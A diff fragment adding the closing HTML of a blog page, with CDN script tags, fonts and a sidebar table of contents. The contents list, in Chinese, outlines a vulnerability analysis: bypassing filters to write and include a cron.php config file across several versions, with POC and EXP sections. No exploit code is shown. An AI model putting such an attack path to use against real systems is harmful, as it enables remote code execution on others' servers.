+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#触发条件">触发条件</a></li>
+    <li><a href="#漏洞描述">漏洞描述</a></li>
+    <li><a href="#漏洞原理">漏洞原理</a>
+      <ol>
+        <li><a href="#在版本v433之前">在版本v4.3.3之前</a></li>
+        <li><a href="#在版本v433到v450下">在版本v4.3.3到v4.5.0下</a>
+          <ol>
+            <li><a href="#add函数的分析">add()函数的分析</a></li>
+            <li><a href="#绕过json编码和xss清洗以及writepathconfigcronphp文件中的包裹">绕过json编码和xss清洗以及<code>WRITEPATH.'config/cron.php'</code>文件中<code>'</code>的包裹</a></li>
+            <li><a href="#包含写入的writepathconfigcronphp文件">包含写入的<code>WRITEPATH.'config/cron.php'</code>文件</a></li>
+          </ol>
+        </li>
+        <li><a href="#版本v451">版本v4.5.1</a>
+          <ol>
+            <li><a href="#绕过json编码xss清洗dr_safe_filename函数的过滤和writepathconfigcronphp文件中的包裹">绕过json编码,xss清洗,dr_safe_filename()函数的过滤和WRITEPATH.&lsquo;config/cron.php&rsquo;文件中&rsquo;的包裹</a></li>
+            <li><a href="#包含写入的writepathconfigcronphp文件-1">包含写入的<code>WRITEPATH.'config/cron.php'</code>文件</a></li>
+          </ol>
+        </li>
+        <li><a href="#在版本v451之后">在版本v4.5.1之后</a></li>
+      </ol>
+    </li>
+    <li><a href="#poc--exp">POC &amp;&amp; EXP</a>
+      <ol>
+        <li><a href="#poc">POC</a></li>
+        <li><a href="#exp">EXP</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
